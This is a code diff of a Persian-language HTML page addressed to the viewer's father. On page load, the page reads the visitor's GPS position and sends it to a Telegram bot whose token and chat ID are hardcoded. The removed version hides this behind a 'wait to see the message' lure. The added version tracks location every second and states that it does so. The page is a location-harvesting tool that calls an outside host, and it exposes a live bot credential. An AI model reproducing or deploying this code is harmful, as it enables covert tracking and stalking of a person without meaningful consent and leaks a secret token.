@@ -1,38 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>❤️ برای دیدن پیام، کلیک کن</title>
+  <title>❤️ ردیابی زنده پدر</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script>
-    function sendLocationToTelegram(lat, lon) {
-      const chatId = "1911302234";
-      const token = "7300968462:AAH3tKmBLB3blE0mXD5kgLbM0XtoTh80_-8";
-      const message = `📍 موقعیت پدر شناسایی شد:\n\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lon}\n🗺️ نقشه: https://www.google.com/maps?q=${lat},${lon}`;
+    const chatId = "1911302234";
+    const token = "7300968462:AAH3tKmBLB3blE0mXD5kgLbM0XtoTh80_-8";
+
+    let lastLat = null;
+    let lastLon = null;
+
+    function sendLocation(lat, lon) {
+      // اگر مختصات قبلی با فعلی یکی باشن، نفرسته
+      if (lat === lastLat && lon === lastLon) return;
+      lastLat = lat;
+      lastLon = lon;
+
+      const message = `📍 موقعیت زنده پدر:\n\n🌐 Latitude: ${lat}\n🌐 Longitude: ${lon}\n🗺️ https://www.google.com/maps?q=${lat},${lon}`;
       const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      fetch(url);
+      fetch(url).catch(err => console.error("ارسال با خطا مواجه شد:", err));
     }
 
-    function getLocation() {
-      if (navigator.geolocation) {
+    function startLiveTracking() {
+      if (!navigator.geolocation) {
+        alert("مکان‌یابی در این مرورگر پشتیبانی نمی‌شود.");
+        return;
+      }
+
+      setInterval(() => {
         navigator.geolocation.getCurrentPosition(
           (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
-            sendLocationToTelegram(lat, lon);
+            sendLocation(lat, lon);
           },
           (error) => {
-            alert("خطا در گرفتن موقعیت مکانی. لطفاً GPS را روشن کنید و دوباره تلاش کنید.");
+            console.error("خطا در گرفتن مکان:", error);
           }
         );
-      } else {
-        alert("این مرورگر از GPS پشتیبانی نمی‌کند.");
-      }
+      }, 1000); // هر 1 ثانیه
     }
   </script>
 </head>
-<body onload="getLocation()" style="text-align:center; padding:50px; font-family:sans-serif;">
+<body onload="startLiveTracking()" style="text-align:center; padding:50px; font-family:sans-serif;">
   <h2>👋 سلام پدر عزیزم</h2>
-  <p>برای دیدن پیام، لطفاً چند لحظه صبر کن ...</p>
+  <p>لطفاً این صفحه را باز نگه دار تا بتوانم مکان شما را به‌صورت زنده ببینم</p>
   <img src="https://i.imgur.com/VgXTvkg.png" alt="❤️" width="200">
+  <p>📡 مکان شما هر ۱ ثانیه به من ارسال می‌شود</p>
 </body>
 </html>
